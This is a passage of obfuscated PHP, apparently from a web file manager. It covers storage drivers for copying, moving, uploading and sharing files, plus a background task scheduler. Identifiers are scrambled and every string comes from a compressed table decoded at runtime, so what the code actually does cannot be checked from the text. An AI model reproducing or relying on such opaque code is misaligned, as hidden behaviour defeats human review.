$äàïú¤ş[$Ö÷ìÍ[1319]][$˜ÌÏ°ê]; $¥ÖÏİå’ = $this->model->mkdir($¥ÖÏİå’, $Á™ÜõØÌ, $œÇ”·Òş); } return $this->getPathOuter($¥ÖÏİå’); } public function copyFile($Ò¯ÔóÖÉ, $ßÀó¾ª¿, $‡»‹‰“ = REPEAT_REPLACE) { $Ä·è¤úà =& $_SERVER[ĞÆÏ¡Îª]; $Äâ¦¼‚ï = $this->parse($ßÀó¾ª¿); $ÁŞÙÅä° = $this->model->copy($Ò¯ÔóÖÉ, $Äâ¦¼‚ï[$Ä·è¤úà[407]], $‡»‹‰“, $Äâ¦¼‚ï[$Ä·è¤úà[84]]); return $ÁŞÙÅä° ? $this->getPathOuter($ÁŞÙÅä°) : !1; } public function moveFile($¡ãüÑ²ü, $€——²àß, $ñ«Şç¤ä = REPEAT_REPLACE) { $Ñ•Ø€Èí =& $_SERVER[ĞÆÏ¡Îª]; $­–‰êÌŠ = $this->parse($€——²àß); $šÉøşş¬ = $this->model->move($¡ãüÑ²ü, $­–‰êÌŠ[$Ñ•Ø€Èí[407]], $ñ«Şç¤ä, $­–‰êÌŠ[$Ñ•Ø€Èí[84]]); return $šÉøşş¬ ? $this->getPathOuter($šÉøşş¬) : !1; } public function copy($º›Ìç„ä, $êÎÊÖ, $…é™Ø– = REPEAT_REPLACE, $©íŒ§¼ = false) { $¡óÜšìù = $this->parse($êÎÊÖ); $µ™ïõä¿ = $this->model->copy($º›Ìç„ä, $¡óÜšìù[$_SERVER[ĞÆÏ¡Îª][407]], $…é™Ø–, $©íŒ§¼); return $µ™ïõä¿ ? $this->getPathOuter($µ™ïõä¿) : !1; } public function moveSameAllow() { } public function move($ şâÇÃ›, $©í÷ù““, $òòØÄ È = REPEAT_REPLACE, $“‚×ş— = false) { $„…Îİ = $this->parse($©í÷ù““); $Õ‡’ğ½¿ = $this->model->move($ şâÇÃ›, $„…Îİ[$_SERVER[ĞÆÏ¡Îª][407]], $òòØÄ È, $“‚×ş—); return $Õ‡’ğ½¿ ? $this->getPathOuter($Õ‡’ğ½¿) : !1; } public function remove($èËéÑ±•, $¥™½¦Éİ = true) { return $this->model->remove($èËéÑ±•, $¥™½¦Éİ); } public function rename($±ôĞÈÙ£, $éúí¥Ğ ) { $ğ³è›‰¹ = $this->model->rename($±ôĞÈÙ£, $éúí¥Ğ ); return $ğ³è›‰¹ ? $this->getPathOuter($±ôĞÈÙ£) : $ğ³è›‰¹; } public function size($ë–¹€Îı) { $Ì¹ëÈ˜’ = $this->infoSimple($ë–¹€Îı); return $Ì¹ëÈ˜’ ? $Ì¹ëÈ˜’[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function infoSimple($­‘Õšåø) { return $this->model->sourceInfo($­‘Õšåø); } public function info($¿ŠŠøçï) { return $this->infoParse($¿ŠŠøçï); } public function infoAuth($ëûßıåÌ) { return $this->infoParse($ëûßıåÌ, !1, !0); } public function infoWithChildren($â³ì­˜) { return $this->infoParse($â³ì­˜, !0); } protected function infoParse($õû…áú, $¶’ë²ş¶ = false, $àÇ»ı¯Å = false) { if (!$¶’ë²ş¶) { return $this->model->pathInfo($õû…áú, $àÇ»ı¯Å); } return $this->model->pathInfoMore($õû…áú); } public function infoFull($İÈ“á”à) { $°©åÀè =& $_SERVER[ĞÆÏ¡Îª]; $²»ôİã = explode($°©åÀè[8], $İÈ“á”à); $§á¦‡» = implode($°©åÀè[8], array_splice($²»ôİã, 1)); return $this->model->pathInfoByPath($²»ôİã[0], $§á¦‡»); } public function hashSimple($²Ÿ“ª°ˆ) { $—êú½êÌ =& $_SERVER[ĞÆÏ¡Îª]; $‘˜’ÖÉ = $this->infoWithChildren($²Ÿ“ª°ˆ); return $‘˜’ÖÉ[$—êú½êÌ[170]][$—êú½êÌ[177]]; } public function hashMd5($Õ’¾˜Ñ») { $ßíÙÑôâ =& $_SERVER[ĞÆÏ¡Îª]; $¸êßåÜá = $this->infoWithChildren($Õ’¾˜Ñ»); return $¸êßåÜá[$ßíÙÑôâ[170]][$ßíÙÑôâ[176]]; } public function exist($“Æ÷âé) { $ó‡ÒÌö =& $_SERVER[ĞÆÏ¡Îª]; $×¼²Á™ = $this->parse($“Æ÷âé); if (!$×¼²Á™[$ó‡ÒÌö[84]]) { return $this->isFile($“Æ÷âé) || $this->isFolder($“Æ÷âé); } $ÙÒ¡ØöÃ = array($ó‡ÒÌö[410] => $×¼²Á™[$ó‡ÒÌö[407]], $ó‡ÒÌö[32] => $×¼²Á™[$ó‡ÒÌö[84]]); $û‹ÒµÉ¸ = $this->model->where($ÙÒ¡ØöÃ)->find(); return $û‹ÒµÉ¸ ? !0 : !1; } public function isFile($İÉ³È™İ) { $ô¥ê¾ÎÏ =& $_SERVER[ĞÆÏ¡Îª]; $™ŸÑøÜÜ = $this->infoSimple($İÉ³È™İ); return $™ŸÑøÜÜ && $™ŸÑøÜÜ[$ô¥ê¾ÎÏ[419]] == $ô¥ê¾ÎÏ[88] ? !1 : !0; } public function isFolder($ŞÀ˜—¡î) { $£ºêé‡ =& $_SERVER[ĞÆÏ¡Îª]; $äí§í¼ä = $this->infoSimple($ŞÀ˜—¡î); return $äí§í¼ä && $äí§í¼ä[$£ºêé‡[419]] == $£ºêé‡[88] ? !0 : !1; } public function listPath($’¥×éÙ², $­×ùÔãÚ = false) { $¿êÚˆÅ =& $_SERVER[ĞÆÏ¡Îª]; if ($’¥×éÙ² == $¿êÚˆÅ[12]) { return !1; } $ŸÔ’¦€õ = array($¿êÚˆÅ[410] => $’¥×éÙ²); if ($­×ùÔãÚ) { return $this->model->listSource($ŸÔ’¦€õ, -1); } return $this->model->listSource($ŸÔ’¦€õ); } public function has($šıÛø»», $Åá‰™ä« = false, $Ï˜¤–‘ = null) { $º‹ÙŸöæ =& $_SERVER[ĞÆÏ¡Îª]; $—×ê«˜¾ = $this->infoWithChildren($šıÛø»»); if ($Åá‰™ä«) { return array($º‹ÙŸöæ[208] => $—×ê«˜¾[$º‹ÙŸöæ[208]], $º‹ÙŸöæ[207] => $—×ê«˜¾[$º‹ÙŸöæ[207]]); } return $Ï˜¤–‘ ? $—×ê«˜¾[$º‹ÙŸöæ[208]] : $—×ê«˜¾[$º‹ÙŸöæ[207]]; } public function listAll($¬¬Ôì•Ş) { $û‘˜ı¡° = IO::info($this->pathParse[$_SERVER[ĞÆÏ¡Îª][84]]); if (!$û‘˜ı¡°) { return array(); } return $this->model->listAll($¬¬Ôì•Ş); } public function getContent($æ¯øıÜå) { return $this->model->getContent($æ¯øıÜå); } public function setContent($ŠËÚ©¶, $¿°ÏÌÈ¸ = '') { return $this->model->setContent($ŠËÚ©¶, $¿°ÏÌÈ¸); } public function fileSubstr($•¥œó , $ÅÂ€ƒ»î, $Û ¡´‘—) { return $this->model->fileSubstr($•¥œó , $ÅÂ€ƒ»î, $Û ¡´‘—); } public function download($úšÂˆ×Œ, $ì¶·‰† = '') { $ŞÙ‡—šß = get_path_father($ì¶·‰†); $¡ğ“¸è… = get_path_this($ì¶·‰†); $ª¿Ó±‹¬ = $this->model->fileInfoGet($úšÂˆ×Œ); $“êü¸‚Í = IO::copy($ª¿Ó±‹¬[$_SERVER[ĞÆÏ¡Îª][84]], $ŞÙ‡—šß, !1, $¡ğ“¸è…); return $“êü¸‚Í; } public function setModifyTime($­÷Ÿ£é›, $‘Ö‘¨‡Á = '') { $’­åœú˜ =& $_SERVER[ĞÆÏ¡Îª]; if (!$­÷Ÿ£é›) { return; } $this->model->where(array($’­åœú˜[426] => $­÷Ÿ£é›))->save(array($’­åœú˜[85] => $‘Ö‘¨‡Á)); } public function upload($†„Òè¦, $Æ‰ºãôƒ, $†‰¢Ï€õ = false, $ñŞƒ² = REPEAT_REPLACE) { $‘€°é”» =& $_SERVER[ĞÆÏ¡Îª]; $Œã·Ø  = $this->parse($†„Òè¦); $ÑÔ÷á©û = $this->model->addFile($Œã·Ø [$‘€°é”»[407]], $Æ‰ºãôƒ, $Œã·Ø [$‘€°é”»[84]], $†‰¢Ï€õ, $ñŞƒ²); return $this->getPathOuter($ÑÔ÷á©û); } public function uploadFileByID($Í­æúÈö, $ã¼™ë±, $»×ê¸Ú¨) { $”ÃšöØ™ =& $_SERVER[ĞÆÏ¡Îª]; $çÊò‰ü¢ = $this->parse($Í­æúÈö); $€õ©‰«ğ = $this->model->addFileByFileID($çÊò‰ü¢[$”ÃšöØ™[407]], $ã¼™ë±, $çÊò‰ü¢[$”ÃšöØ™[84]], $»×ê¸Ú¨); return $this->getPathOuter($€õ©‰«ğ); } public function addFileByRemote($…¶¿ú, $óúÃ×¼‡, $ÀÒˆÜŒĞ = array(), $ñÇÃæÇ½ = '', $¡¹ø¤î) { $¢Â²å‡ã =& $_SERVER[ĞÆÏ¡Îª]; $ÈšÉ’©Ë = $this->parse($…¶¿ú); $ñÇÃæÇ½ = empty($ñÇÃæÇ½) ? $ÈšÉ’©Ë[$¢Â²å‡ã[84]] : $ñÇÃæÇ½; $æéÍÃË¼ = $this->model->addFileByRemote($ÈšÉ’©Ë[$¢Â²å‡ã[407]], $óúÃ×¼‡, $ñÇÃæÇ½, $ÀÒˆÜŒĞ, $¡¹ø¤î); return $this->getPathOuter($æéÍÃË¼); } public function uploadLink($’â£¢îÃ, $ãå–¬ÀÑ = 0) { $äÓà±òâ =& $_SERVER[ĞÆÏ¡Îª]; $âÌùØÛ† = $this->parse($’â£¢îÃ); $é×›ØÜŒ = _get($GLOBALS[$äÓà±òâ[7]], $äÓà±òâ[1320]); $•Äµƒ¤Î = _get($GLOBALS[$äÓà±òâ[7]], $äÓà±òâ[1321]); $’â£¢îÃ = Model($äÓà±òâ[618])->createFileName($âÌùØÛ†[$äÓà±òâ[84]], $é×›ØÜŒ, $•Äµƒ¤Î); return IO::uploadLink($’â£¢îÃ, $ãå–¬ÀÑ); } public function fileNameAuto($‹Ü‡á ­, $ÂëÁ, $­µë—¥¼ = REPEAT_REPLACE, $ˆ‡¨†²â = false) { return $this->model->fileNameAuto($‹Ü‡á ­, $ÂëÁ, $­µë—¥¼, $ˆ‡¨†²â); } public function fileNameExist($µôõ„Î, $–‡¿¬øì) { return $this->model->fileNameExist($µôõ„Î, $–‡¿¬øì); } protected function _fileOut($¤¿¹ğ›Œ, $†ú¤µ†Í = false, $ÛÛûŠ…¢ = false, $÷¡â¤• = '', $ÇÇ´ÆÜ» = false) { $êøã¶õƒ =& $_SERVER[ĞÆÏ¡Îª]; $—Íì»ªÄ = $this->model->sourceInfo($¤¿¹ğ›Œ); if ($—Íì»ªÄ[$êøã¶õƒ[419]] == $êøã¶õƒ[88]) { header($êøã¶õƒ[1322]); die; } $­ò¬Ïµå = $this->model->fileInfoGet($¤¿¹ğ›Œ); $÷¡â¤• = $­ò¬Ïµå[$êøã¶õƒ[176]] ? $­ò¬Ïµå[$êøã¶õƒ[176]] : $÷¡â¤•; $ä¥×£¨Ç = isset($GLOBALS[$êøã¶õƒ[1323]]) ? $GLOBALS[$êøã¶õƒ[1323]] : $—Íì»ªÄ[$êøã¶õƒ[32]]; if ($ÇÇ´ÆÜ») { return IO::fileOutServer($­ò¬Ïµå[$êøã¶õƒ[84]], $†ú¤µ†Í, $ä¥×£¨Ç, $÷¡â¤•); } IO::fileOut($­ò¬Ïµå[$êøã¶õƒ[84]], $†ú¤µ†Í, $ä¥×£¨Ç, $÷¡â¤•); } public function fileOut($ô¿ñ§¸§, $ÀÖ³®á = false, $±®şÈÃ² = false, $õ§›Û—£ = '') { $this->_fileOut($ô¿ñ§¸§, $ÀÖ³®á, $±®şÈÃ², $õ§›Û—£); } public function fileOutServer($Â¯¸ûà, $³’æêÃê = false, $¢·şĞ = false, $¥ º‹¬… = '') { $this->_fileOut($Â¯¸ûà, $³’æêÃê, $¢·şĞ, $¥ º‹¬…, !0); } protected function _fileOutImage($‰­¶Œø©, $Å±«Îô = 250) { $—áì”û… =& $_SERVER[ĞÆÏ¡Îª]; $øªˆä¯ = $this->model->pathInfo($‰­¶Œø©); if ($øªˆä¯[$—áì”û…[419]] == $—áì”û…[88]) { show_json($—áì”û…[1324] . $‰­¶Œø©, !1); } $†ËøºŒÎ = $this->model->fileInfoGet($‰­¶Œø©); $†ËøºŒÎ[$—áì”û…[32]] = $øªˆä¯[$—áì”û…[32]]; $†ËøºŒÎ[$—áì”û…[169]] = $øªˆä¯[$—áì”û…[169]]; $GLOBALS[$—áì”û…[1323]] = $†ËøºŒÎ[$—áì”û…[32]]; $GLOBALS[$—áì”û…[168]] = $†ËøºŒÎ; IO::fileOutImage($†ËøºŒÎ[$—áì”û…[84]], $Å±«Îô); } public function fileOutImage($µ‘Æ£å, $½ÃØ¯ƒ„ = 250) { $this->_fileOutImage($µ‘Æ£å, $½ÃØ¯ƒ„); } public function fileOutImageServer($çöóâı, $íÖé ‘ = 250) { $this->_fileOutImage($çöóâı, $íÖé ‘); } public function link($±«Ìıüû, $øÎòê‘¾ = '') { $œÜ’ß×º = $this->model->fileInfoGet($±«Ìıüû); return IO::link($œÜ’ß×º[$_SERVER[ĞÆÏ¡Îª][84]], $øÎòê‘¾); } protected function parse($ò÷ÉÉÍ‹) { $„‰²±ï =& $_SERVER[ĞÆÏ¡Îª]; if (strstr($ò÷ÉÉÍ‹, $„‰²±ï[8]) === !1) { return array($„‰²±ï[428] => intval($ò÷ÉÉÍ‹), $„‰²±ï[84] => $„‰²±ï[12], $„‰²±ï[1319] => array()); } $ÂûªÂ¹¤ = explode($„‰²±ï[8], trim($ò÷ÉÉÍ‹, $„‰²±ï[8])); if (count($ÂûªÂ¹¤) < 2) { show_tips(clear_html($ò÷ÉÉÍ‹) . $„‰²±ï[1325]); } return array($„‰²±ï[428] => intval($ÂûªÂ¹¤[0]), $„‰²±ï[84] => $ÂûªÂ¹¤[1], $„‰²±ï[1319] => array_slice($ÂûªÂ¹¤, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ìæ·îûí) { $this->pathParse = $ìæ·îûí; $this->model = Model($_SERVER[ĞÆÏ¡Îª][1318]); } public function getPathOuter($Ûœ­÷äÖ) { $ãë„˜Ò¥ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ûœ­÷äÖ) { return $Ûœ­÷äÖ; } $„ıØ¢»§ = $this->parse($Ûœ­÷äÖ); return trim(KodIO::makeShare($this->pathParse[$ãë„˜Ò¥[407]], $„ıØ¢»§[$ãë„˜Ò¥[407]]), $ãë„˜Ò¥[8]); } protected function infoParse($òÇÛ¥ó—, $Ü‚ùÛÔ¡ = false, $ÑÍ®°êú = false) { $Åê»Å£Ş =& $_SERVER[ĞÆÏ¡Îª]; $ÑĞæÂ’¡ = $this->pathParse[$Åê»Å£Ş[407]]; $¸†Ï‡ğ‚ = trim($this->pathParse[$Åê»Å£Ş[1160]], $Åê»Å£Ş[8]); return Action($Åê»Å£Ş[1326])->sharePathInfo($ÑĞæÂ’¡, $¸†Ï‡ğ‚, $Ü‚ùÛÔ¡); } public function infoFull($¨úÚõøÇ) { $ö²õÏÚş =& $_SERVER[ĞÆÏ¡Îª]; $ßäáÆÙî = explode($ö²õÏÚş[8], trim($¨úÚõøÇ, $ö²õÏÚş[8])); if (count($ßäáÆÙî) > 1) { $Šê„ÈÄø = implode($ö²õÏÚş[8], array_splice($ßäáÆÙî, 1)); $¸ŒêÑöÎ = $this->model->pathInfoByPath($ßäáÆÙî[0], $Šê„ÈÄø); if (!$¸ŒêÑöÎ) { return !1; } $this->pathParse[$ö²õÏÚş[1160]] = $¸ŒêÑöÎ[$ö²õÏÚş[411]]; } return $this->infoParse($¨úÚõøÇ); } public function listAll($ñÉ™Ç…¸) { $Ö®ªÄöó =& $_SERVER[ĞÆÏ¡Îª]; $èøİµôİ = IO::info($this->pathParse[$Ö®ªÄöó[84]]); if (!$èøİµôİ) { return array(); } $Ó¨éûÃ‰ = $this->model->listAll($ñÉ™Ç…¸); $Ë¸´êš = Model($Ö®ªÄöó[610])->getInfo($èøİµôİ[$Ö®ªÄöó[498]]); $»Ã¹˜¢Ç = Action($Ö®ªÄöó[1326]); foreach ($Ó¨éûÃ‰ as &$Ÿ œÁ÷º) { check_abort(); $Ÿ œÁ÷º[$Ö®ªÄöó[86]] = $»Ã¹˜¢Ç->_shareItemeParse($Ÿ œÁ÷º[$Ö®ªÄöó[86]], $Ë¸´êš); } unset($Ÿ œÁ÷º); return $Ó¨éûÃ‰; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ØÄ“°’ş) { $this->pathParse = $ØÄ“°’ş; $this->model = Model($_SERVER[ĞÆÏ¡Îª][1318]); } protected function infoParse($«ë”³¸Ö, $‘²İŸ¾ò = false, $Á®òÜ’¬ = false) { $»»­öÒÌ =& $_SERVER[ĞÆÏ¡Îª]; return Action($»»­öÒÌ[1166])->sharePathInfo($this->pathParse[$»»­öÒÌ[84]], !0, $‘²İŸ¾ò); } public function listPath($Ë„İì¤ì, $‰ë“¡§È = false) { $ÎîÜã£ =& $_SERVER[ĞÆÏ¡Îª]; $í÷•âË’ = parent::listPath($Ë„İì¤ì, $‰ë“¡§È); if (!$í÷•âË’) { return $í÷•âË’; } if (is_array($í÷•âË’[$ÎîÜã£[1327]])) { $í÷•âË’[$ÎîÜã£[1327]] = Action($ÎîÜã£[1166])->shareItemInfo($í÷•âË’[$ÎîÜã£[1327]]); } foreach ($í÷•âË’ as $¨’ªá²ş => $º…åÈí) { if (!in_array($¨’ªá²ş, array($ÎîÜã£[83], $ÎîÜã£[82]))) { continue; } foreach ($º…åÈí as $ŠĞÃ“ÕÊ => $½²»ÒÔ) { $í÷•âË’[$¨’ªá²ş][$ŠĞÃ“ÕÊ] = Action($ÎîÜã£[1166])->shareItemInfo($½²»ÒÔ); } } return $í÷•âË’; } public function listAll($ÙÊõÎÁ×) { $„ãÏ­ =& $_SERVER[ĞÆÏ¡Îª]; $¥èğ¨ê = IO::info($this->pathParse[$„ãÏ­[84]]); if (!$¥èğ¨ê) { return array(); } $ù¶ö›¨ = $this->model->listAll($ÙÊõÎÁ×); foreach ($ù¶ö›¨ as &$ŒÙ¸ıĞÕ) { $ŒÙ¸ıĞÕ[$„ãÏ­[86]] = Action($„ãÏ­[1166])->shareItemInfo($ŒÙ¸ıĞÕ[$„ãÏ­[86]]); } unset($ŒÙ¸ıĞÕ); return $ù¶ö›¨; } } goto BŒ—¢Í…Æ‹; FË¹¤«İ¨•: define($_SERVER[ĞÆÏ¡Îª][0], $_SERVER[ĞÆÏ¡Îª][1]); $_SERVER[õú¨»™] = explode($_SERVER[ĞÆÏ¡Îª][2], gzinflate(substr($_SERVER[ĞÆÏ¡Îª][3], 10, -8))); function binCheckEq($è½æ“Õ’, $ÂÉûÓÕ) { return $è½æ“Õ’ == $ÂÉûÓÕ; } goto c÷óñîåËÖ; f§Û±Ûµ‡: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $€Öâë‡ =& $_SERVER[ĞÆÏ¡Îª]; if (self::valueGet($€Öâë‡[745]) != $€Öâë‡[88]) { return; } if (self::valueGet($€Öâë‡[1606]) == $€Öâë‡[88]) { $Ÿ’ëÛµŠ = self::valueGet($€Öâë‡[1607]); if (time() - $Ÿ’ëÛµŠ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$€Öâë‡[1608]] = 1; self::valueSet($€Öâë‡[1606], $€Öâë‡[88]); self::log($€Öâë‡[1609] . ACTION . $€Öâë‡[1610]); Session::$data = array(); Session::$sessionSign = $€Öâë‡[12]; $GLOBALS[$€Öâë‡[512]] = 1; Hook::bind($€Öâë‡[1611], $€Öâë‡[1612]); $µÙ¢åª¢ = 0; while (!0) { self::cacheClear(); if (self::valueGet($€Öâë‡[745]) != $€Öâë‡[88]) { self::valueSet($€Öâë‡[1606], $€Öâë‡[197]); self::log($€Öâë‡[1613]); die; } $Ú…™À– = time(); if ($Ú…™À– - $µÙ¢åª¢ >= 60) { self::valueSet(array($€Öâë‡[1606] => $€Öâë‡[88], $€Öâë‡[1607] => $Ú…™À–), !1); $µÙ¢åª¢ = $Ú…™À–; } if (!file_exists(USER_SYSTEM . $€Öâë‡[1614])) { self::valueSet(array($€Öâë‡[1606] => $€Öâë‡[197], $€Öâë‡[745] => $€Öâë‡[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $‚¸¿ ¶ù =& $_SERVER[ĞÆÏ¡Îª]; http_close(); self::valueSet($‚¸¿ ¶ù[745], $‚¸¿ ¶ù[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‚¸¿ ¶ù[1606] => $‚¸¿ ¶ù[197], $‚¸¿ ¶ù[745] => $‚¸¿ ¶ù[88]), !1); } public static function taskSwitch() { $–¸¹»ùØ =& $_SERVER[ĞÆÏ¡Îª]; $‹“à¤æ = self::valueGet($–¸¹»ùØ[745]) == $–¸¹»ùØ[88] ? $–¸¹»ùØ[197] : $–¸¹»ùØ[88]; self::valueSet($–¸¹»ùØ[745], $‹“à¤æ); } public static function shutdownEvent() { $¶â¤Õšù =& $_SERVER[ĞÆÏ¡Îª]; self::valueSet($¶â¤Õšù[1606], $¶â¤Õšù[197]); self::log($¶â¤Õšù[1615]); } public static function config($ò¨€˜Ô‚, $”«Ô°ÃÔ) { self::valueSet($_SERVER[ĞÆÏ¡Îª][745], $ò¨€˜Ô‚); } private static function taskRunAll() { $è¤÷®ä‹ =& $_SERVER[ĞÆÏ¡Îª]; $§Ù›öãâ = timeFloat(); $‹‰à¡½Ş = Model($è¤÷®ä‹[1616])->listData(); $ùş¬è÷ = count($‹‰à¡½Ş); for ($¿‹”´¹ = 0; $¿‹”´¹ < $ùş¬è÷; $¿‹”´¹++) { $öØÊ¯·Ó = $‹‰à¡½Ş[$¿‹”´¹]; if (!$öØÊ¯·Ó[$è¤÷®ä‹[407]] || $öØÊ¯·Ó[$è¤÷®ä‹[1617]] != $è¤÷®ä‹[88]) { continue; } if (!self::taskTimeCheck($öØÊ¯·Ó)) { continue; } self::taskRun($öØÊ¯·Ó); } Hook::trigger($è¤÷®ä‹[1618]); self::taskQueueRun($§Ù›öãâ); } private static function taskQueueRun($ïÓÒ½º) { $ì¤‰Æî = 10; while (!0) { $ÊŒÙîêÙ = TaskQueue::run(); if ($ÊŒÙîêÙ === !1) { break; } if (timeFloat() - $ïÓÒ½º >= $ì¤‰Æî) { break; } } } private static function taskTimeCheck($Ì¢‡œš) { $ÕÍ±ù =& $_SERVER[ĞÆÏ¡Îª]; $³¸ÎÛüÉ = json_decode($Ì¢‡œš[$ÕÍ±ù[203]], !0); $ºİÅ½×¤ = intval($Ì¢‡œš[$ÕÍ±ù[1607]]); $¢ıè¦‚š = strtotime($ÕÍ±ù[1619] . $³¸ÎÛüÉ[$ÕÍ±ù[1620]] . $ÕÍ±ù[1621]) - strtotime($ÕÍ±ù[1622]); $Ä «áï = time() - strtotime(date($ÕÍ±ù[1623]) . $ÕÍ±ù[1624]); $ˆ”‹‚¬Õ = $Ä «áï >= $¢ıè¦‚š && $Ä «áï <= $¢ıè¦‚š + 3600; switch ($³¸ÎÛüÉ[$ÕÍ±ù[33]]) { case $ÕÍ±ù[1625]: if (time() - $ºİÅ½×¤ < 3600 * 24 * 30) { return !1; } if ($³¸ÎÛüÉ[$ÕÍ±ù[1625]] == date($ÕÍ±ù[1626]) && $ˆ”‹‚¬Õ) { return !0; } break; case $ÕÍ±ù[1627]: if (time() - $ºİÅ½×¤ < 3600 * 24 * 7) { return !1; } $€ğ°‡€“ = date($ÕÍ±ù[1628]) == 0 ? 7 : date($ÕÍ±ù[1628]); if ($³¸ÎÛüÉ[$ÕÍ±ù[1627]] == $€ğ°‡€“ && $ˆ”‹‚¬Õ) { return !0; } break; case $ÕÍ±ù[1620]: if (time() - $ºİÅ½×¤ < 3600 * 24) { return !1; } if ($ˆ”‹‚¬Õ) { return !0; } break; case $ÕÍ±ù[1629]: if (time() - $ºİÅ½×¤ >= floatval($³¸ÎÛüÉ[$ÕÍ±ù[1629]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Å©Ä™ş˜ =& $_SERVER[ĞÆÏ¡Îª]; static $«Ê»²óú = 0; $‚ÊòÊÎ = 300; if (!$«Ê»²óú) { $«Ê»²óú = time(); } if (time() - $«Ê»²óú < $‚ÊòÊÎ) { return; } $«Ê»²óú = time(); $´¯æÀ«à = Model($Å©Ä™ş˜[522])->db($Å©Ä™ş˜[12]); if ($´¯æÀ«à) { $´¯æÀ«à->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Å©Ä™ş˜[1630], $Å©Ä™ş˜[1631]); die; } } public static function taskRun($êÈ¥´Ñ ) { $ĞêğÂîë =& $_SERVER[ĞÆÏ¡Îª]; self::log($ĞêğÂîë[1632] . $êÈ¥´Ñ [$ĞêğÂîë[407]] . $ĞêğÂîë[1633] . $êÈ¥´Ñ [$ĞêğÂîë[32]] . $ĞêğÂîë[1634] . $êÈ¥´Ñ [$ĞêğÂîë[1635]]); Model($ĞêğÂîë[1616])->run($êÈ¥´Ñ [$ĞêğÂîë[407]]); $·Î½ª±Ù = timeFloat(); $°–´™‡ç = $ĞêğÂîë[12]; switch ($êÈ¥´Ñ [$ĞêğÂîë[33]]) { case $ĞêğÂîë[316]: $°ò¬¨ª = url_request($êÈ¥´Ñ [$ĞêğÂîë[1635]], $ĞêğÂîë[230], !1, !1, !1, !1, 10); if ($°ò¬¨ª[$ĞêğÂîë[745]]) { $°–´™‡ç = strlen($°ò¬¨ª[$ĞêğÂîë[1184]]); } break; case $ĞêğÂîë[229]: $°–´™‡ç = Hook::apply($êÈ¥´Ñ [$ĞêğÂîë[1635]]); default: break; } Model($ĞêğÂîë[1636])->add(array($ĞêğÂîë[1637] => $ĞêğÂîë[12], $ĞêğÂîë[1638] => $ĞêğÂîë[197], $ĞêğÂîë[33] => $ĞêğÂîë[1639] . $êÈ¥´Ñ [$ĞêğÂîë[407]], $ĞêğÂîë[1640] => json_encode(array($ĞêğÂîë[32] => $êÈ¥´Ñ [$ĞêğÂîë[32]], $ĞêğÂîë[1641] => timeFloat() - $·Î½ª±Ù, $ĞêğÂîë[302] => $°–´™‡ç)))); $¬ª—ÏşÉ = $°–´™‡ç ? $ĞêğÂîë[1642] . $°–´™‡ç : $ĞêğÂîë[12]; self::log($ĞêğÂîë[1643] . $êÈ¥´Ñ [$ĞêğÂîë[407]] . $ĞêğÂîë[164] . $¬ª—ÏşÉ); return !0; } private static function valueGet($£óş‹Ãˆ) { $ûÕƒ«¯Ë =& $_SERVER[ĞÆÏ¡Îª]; $­¾ıêã = $ûÕƒ«¯Ë[1644]; $•¯ºÖØü = Model($ûÕƒ«¯Ë[444])->get($£óş‹Ãˆ, $­¾ıêã); if (is_null($•¯ºÖØü)) { Model($ûÕƒ«¯Ë[444])->set($ûÕƒ«¯Ë[745], $ûÕƒ«¯Ë[88], $­¾ıêã); Model($ûÕƒ«¯Ë[444])->set($ûÕƒ«¯Ë[1606], $ûÕƒ«¯Ë[197], $­¾ıêã); $•¯ºÖØü = Model($ûÕƒ«¯Ë[444])->get($£óş‹Ãˆ, $­¾ıêã); } return $•¯ºÖØü; } private static function valueSet($´Øä¬ıÀ, $¬¸šÍ÷–) { $Ú«çŠòõ =& $_SERVER[ĞÆÏ¡Îª]; $÷«ğ…Ü¢ = $Ú«çŠòõ[1645]; CacheLock::lock($÷«ğ…Ü¢); $¶ëÌìğÌ = Model($Ú«çŠòõ[444])->set($´Øä¬ıÀ, $¬¸šÍ÷–, $Ú«çŠòõ[1644]); CacheLock::unlock($÷«ğ…Ü¢); return $¶ëÌìğÌ; } protected static function log($Üòà¸Ø°) { write_log($Üòà¸Ø°, $_SERVER[ĞÆÏ¡Îª][1631]); } private static function cacheClear() { $ªÃËÉ€À =& $_SERVER[ĞÆÏ¡Îª]; Cache::clearMemory(Model($ªÃËÉ€À[444])->cacheKey($ªÃËÉ€À[1644])); Cache::clearMemory(Model($ªÃËÉ€À[444])->cacheKey($ªÃËÉ€À[1646])); Model($ªÃËÉ€À[1616])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\151\156\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($›µóÄúø, $ŒŸ¸’° = '', $—¸ÌÙÇ = 0, $…šú¥Íİ = '') { $©ñ¶Ä¨ö =& $_SERVER[ĞÆÏ¡Îª]; if (self::get($›µóÄúø)) { return; } $this->task = array($©ñ¶Ä¨ö[407] => $›µóÄúø, $©ñ¶Ä¨ö[1647] => USER_ID, $©ñ¶Ä¨ö[1546] => $…šú¥Íİ, $©ñ¶Ä¨ö[33] => $ŒŸ¸’°, $©ñ¶Ä¨ö[1055] => $©ñ¶Ä¨ö[12], $©ñ¶Ä¨ö[781] => $—¸ÌÙÇ, $©ñ¶Ä¨ö[1648] => 0, $©ñ¶Ä¨ö[1649] => 0, $©ñ¶Ä¨ö[1650] => 0, $©ñ¶Ä¨ö[1651] => timeFloat(), $©ñ¶Ä¨ö[1652] => 0, $©ñ¶Ä¨ö[1653] => 0, $©ñ¶Ä¨ö[1654] => 0, $©ñ¶Ä¨ö[1655] => 0, $©ñ¶Ä¨ö[745] => $©ñ¶Ä¨ö[1606]); $GLOBALS[$©ñ¶Ä¨ö[1656]] = 1; Hook::bind($©ñ¶Ä¨ö[1611], array($this, $©ñ¶Ä¨ö[1657])); Hook::bind($©ñ¶Ä¨ö[1658], array($this, $©ñ¶Ä¨ö[1659])); $this->startAfter(); Hook::trigger($©ñ¶Ä¨ö[1660], $this->task); 